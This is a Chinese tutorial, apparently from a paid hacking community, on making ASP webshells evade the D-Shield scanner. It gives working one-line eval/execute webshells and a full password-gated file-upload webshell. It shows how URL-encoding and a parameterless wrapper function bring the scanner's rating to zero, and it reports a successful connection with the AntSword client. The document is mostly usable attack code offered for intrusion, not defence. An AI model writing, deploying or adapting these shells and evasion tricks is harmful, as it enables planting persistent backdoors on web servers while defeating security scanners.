# [知识星球]WebShell免杀之ASP


<meta name="referrer" content="no-referrer" />

## 前言

授人以鱼不如授人以渔

所以准备给星球写一份免杀的系列文章

让大家自己掌握免杀的一些技巧跟方法，这样即使脚本失效也不用每次都催着我更新了

正好前一段时间有成员问我asp免杀的问题，那就先拿asp开刀吧。

## 正文

### 第一步，确定免杀目标

比如普通的asp一句话就是

```
<% eval(request("mr6"))%>
```

或者

```
<% execute request("mr6") %>
```

也就是说你的shell在一系列操作之后要达到这种效果

因为eval execute在asp中类似一种语言结构，除了大小写之外不能对其进行变化

所以我们混淆的重点主要是后面的`request("mr6")`参数

### 第二步，打开语法手册

百度搜一个asp语法手册

https://www.w3school.com.cn/vbscript/vbscript_ref_functions.asp

查找到字符串有关的函数，随便选一个

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426242-c5439bf5-fa16-4930-81b2-8a0b198ded3a.png)

他这里只是显示了一部分，我就拿`unescape`来举例子

### 第三步，混淆

unescape在asp中相当于php的urldecode，就是url编码

所以先把payload给编码一遍

为了增强混淆的效果，所以采用burp的decoder模块，因为burp是对所有字符进行编码。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426354-ba518017-dd6a-4b29-9184-09e52b88db88.png)

扫一下，发现四级

提示eval参数xxxx

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426447-5ab2d424-cdbc-4d52-bebc-9dbd65762e6e.png)

那么我们定义个函数传进去呢

发现已经降到了一级

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426618-ffe2f982-67f9-435f-8d92-12cfca68d245.png)

但是我们的目标是做到0级

继续分析一下查杀的原因是`参数test(xxxx)`

随便改一下参数内容试一下

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426738-9f184ef1-554f-49e2-becf-19f413e98a61.png)

当我们传入123456时还是报一级，说明这时D盾查杀的只是调用，而跟你传什么东西没有关系

把参数删掉试试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426851-66334884-40d3-4712-accc-771fa27101ea.png)

此时D盾就不再提示了

所以我们只需要构造一个无参数函数即可

```
<%
Function test():
    dim aaa
    aaa="%65%76%61%6c%28%72%65%71%75%65%73%74%28%22%6d%72%36%22%29%29"
	test = unescape(aaa)
End Function
eval(test())
%>
```

成功bypass D盾

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427004-4b327513-1e77-4bc5-bdc7-eb508f3b1074.png)

使用蚁剑成功连接

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427136-36fcb5af-d673-4879-bfe2-1a5c6f2f7e8d.png)

原理都是一样的，一个函数被杀了就换一个函数

## 反思拓展

既然我们可以把任意的payload编码一下然后eval，那么我们是否可以用同样的办法实现对任意文件免杀？

答案当然是可以的

但是我们前提是要说明一点区别

### eval与execute

#### Eval 计算一个表达式的值并返回结果

语法：[result = ]Eval(expression)

expression 为任意有效 VBScript 表达式的字符串

示例：response.Write(eval("3+2")) '输出 5

"3+2" 使用引号括起来，表示是一个字符串，但是在 Eval “眼里”，把它当作一个表达式 3+2 来执行。

#### Execute 执行一个或多个指定的语句。多个语句间用冒号（:）隔开

语法：Execute statements

示例：Execute "response.Write(""abc"")" '输出 abc

"response.Write(""abc"")" 使用引号括起来，表示是一个字符串，但是在 Execute “眼里”，把它当作一个语句 response.Write("abc") 来执行。

也就是说对于小马来说只有一句话，所以两者用哪个都可以

但是大马是多句，就不能用eval来执行了，而要用execute

## 具体实现

首先随便找个大马

```
<%
on error resume next
%>
<%
  if request("pass")="g" then  '在这修改密码
  session("pw")="go"
  end if
%>
<%if session("pw")<>"go" then %>
<%="<center><br><form action='' method='post'>"%>
<%="<input name='pass' type='password' size='10'> <input "%><%="type='submit' value='test'></center>"%>
<%else%>
<%
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
%>
<%="yes"%>
<%else%>
<%="no"%>
<%
end if
err.clear
end if
da.close
%>
<%set da=nothing%>
<%set fos=nothing%>
<%="<form action='' method=post>"%>
<%="<input type=text name=path>"%>
<%="<br>"%>
<%="当前文件路径:"&server.mappath(request.servervariables("script_name"))%>
<%="<br>"%>
<%="操作系统为:"&Request.ServerVariables("OS")%>
<%="<br>"%>
<%="WEB服务器版本为:"&Request.ServerVariables("SERVER_SOFTWARE")%>
<%="<br>"%>
<%="服务器的IP为:"&Request.ServerVariables("LOCAL_ADDR")%>
<%="<br>"%>
<%=""%>
<%="<textarea name=da cols=50 rows=10 width=30></textarea>"%>
<%="<br>"%>
<%="<input type=submit value=save>"%>
<%="</form>"%>
<%end if%>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427239-1d1aa604-cd29-41e6-b1d5-e29f89334513.png)

因为只是举例子，就找一个具有文件保存的大马

扫一下不出意外的被杀

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427428-f7ccf646-4003-4b52-aff7-b03a034cc431.png)

### 代码处理

首先把多余的标签给去掉，只留下中间的代码

**如果采用url编码的话一定要去掉里面所有的中文！**

**否则会一直报未结束的字符串常量错误**

```
on error resume next
  if request("pass")="g" then
  session("pw")="go"
  end if
if session("pw")<>"go" then 
response.write("<center><br><form action='' method='post'>")
response.write("<input name='pass' type='password' size='10'> <input ")
response.write("type='submit' value='test'></center>")
else
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
response.write("yes")
else
response.write("no")
end if
err.clear
end if
da.close
set da=nothing
set fos=nothing
response.write("<form action='' method=post>")
response.write("<input type=text name=path>")
response.write("<br>")
response.write("path:"&server.mappath(request.servervariables("script_name")))
response.write("<br>")
response.write("os:"&Request.ServerVariables("OS"))
response.write("<br>")
response.write("WEB:"&Request.ServerVariables("SERVER_SOFTWARE"))
response.write("<br>")
response.write("IP:"&Request.ServerVariables("LOCAL_ADDR"))
response.write("<br>")
response.write("")
response.write("<textarea name=da cols=50 rows=10 width=30></textarea>")
response.write("<br>")
response.write("<input type=submit value=save>")
response.write("</form>")
end if
```

然后扔到burp里进行url编码

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427560-1640f0f9-ef11-4a7f-9e82-09e51ceff7eb.png)

然后外层包裹上执行代码

```
<%
execute (unescape("%6f%6e%20%65%72%72%6f%72%20%72%65%73%75%6d%65%20%6e%65%78%74%0a%20%20%69%66%20%72%65%71%75%65%73%74%28%22%70%61%73%73%22%29%3d%22%67%22%20%74%68%65%6e%0a%20%20%73%65%73%73%69%6f%6e%28%22%70%77%22%29%3d%22%67%6f%22%0a%20%20%65%6e%64%20%69%66%0a%69%66%20%73%65%73%73%69%6f%6e%28%22%70%77%22%29%3c%3e%22%67%6f%22%20%74%68%65%6e%20%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%63%65%6e%74%65%72%3e%3c%62%72%3e%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%27%27%20%6d%65%74%68%6f%64%3d%27%70%6f%73%74%27%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%27%70%61%73%73%27%20%74%79%70%65%3d%27%70%61%73%73%77%6f%72%64%27%20%73%69%7a%65%3d%27%31%30%27%3e%20%3c%69%6e%70%75%74%20%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%74%79%70%65%3d%27%73%75%62%6d%69%74%27%20%76%61%6c%75%65%3d%27%31%32%33%27%3e%3c%2f%63%65%6e%74%65%72%3e%22%29%0a%65%6c%73%65%0a%0a%73%65%74%20%66%73%6f%3d%73%65%72%76%65%72%2e%63%72%65%61%74%65%6f%62%6a%65%63%74%28%22%73%63%72%69%70%74%69%6e%67%2e%66%69%6c%65%73%79%73%74%65%6d%6f%62%6a%65%63%74%22%29%0a%70%61%74%68%3d%72%65%71%75%65%73%74%28%22%70%61%74%68%22%29%0a%69%66%20%70%61%74%68%3c%3e%22%22%20%74%68%65%6e%0a%64%61%74%61%3d%72%65%71%75%65%73%74%28%22%64%61%22%29%0a%73%65%74%20%64%61%3d%66%73%6f%2e%63%72%65%61%74%65%74%65%78%74%66%69%6c%65%28%70%61%74%68%2c%74%72%75%65%29%0a%64%61%2e%77%72%69%74%65%20%64%61%74%61%0a%69%66%20%65%72%72%3d%30%20%74%68%65%6e%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%79%65%73%22%29%0a%65%6c%73%65%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%6e%6f%22%29%0a%65%6e%64%20%69%66%0a%65%72%72%2e%63%6c%65%61%72%0a%65%6e%64%20%69%66%0a%64%61%2e%63%6c%6f%73%65%0a%73%65%74%20%64%61%3d%6e%6f%74%68%69%6e%67%0a%73%65%74%20%66%6f%73%3d%6e%6f%74%68%69%6e%67%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%27%27%20%6d%65%74%68%6f%64%3d%70%6f%73%74%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%69%6e%70%75%74%20%74%79%70%65%3d%74%65%78%74%20%6e%61%6d%65%3d%70%61%74%68%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%70%61%74%68%3a%22%26%73%65%72%76%65%72%2e%6d%61%70%70%61%74%68%28%72%65%71%75%65%73%74%2e%73%65%72%76%65%72%76%61%72%69%61%62%6c%65%73%28%22%73%63%72%69%70%74%5f%6e%61%6d%65%22%29%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%6f%73%3a%22%26%52%65%71%75%65%73%74%2e%53%65%72%76%65%72%56%61%72%69%61%62%6c%65%73%28%22%4f%53%22%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%57%45%42%3a%22%26%52%65%71%75%65%73%74%2e%53%65%72%76%65%72%56%61%72%69%61%62%6c%65%73%28%22%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%22%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%49%50%3a%22%26%52%65%71%75%65%73%74%2e%53%65%72%76%65%72%56%61%72%69%61%62%6c%65%73%28%22%4c%4f%43%41%4c%5f%41%44%44%52%22%29%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%74%65%78%74%61%72%65%61%20%6e%61%6d%65%3d%64%61%20%63%6f%6c%73%3d%35%30%20%72%6f%77%73%3d%31%30%20%77%69%64%74%68%3d%33%30%3e%3c%2f%74%65%78%74%61%72%65%61%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%62%72%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%69%6e%70%75%74%20%74%79%70%65%3d%73%75%62%6d%69%74%20%76%61%6c%75%65%3d%73%61%76%65%3e%22%29%0a%72%65%73%70%6f%6e%73%65%2e%77%72%69%74%65%28%22%3c%2f%66%6f%72%6d%3e%22%29%0a%65%6e%64%20%69%66"))
%>
```

先试一下能不能运行

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427667-4e504625-06df-4b60-878f-ed0b2f58aa99.png)

保存个文件试试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427780-8cc387cd-c1be-4d0f-ad47-d870f855bac5.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427865-cb5b71e8-27e2-4303-bc74-32f399e7b297.png)

保存成功

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427956-48c09fa8-d5ec-408a-a6b2-65c62ba366a5.png)

用D盾扫一扫，直接就bypass了。。。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900428042-cfe08805-846c-4160-9b23-dbc4ba326ac7.png)

看来D盾对于超长字符串参数也是不敏感

## 最后

套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。
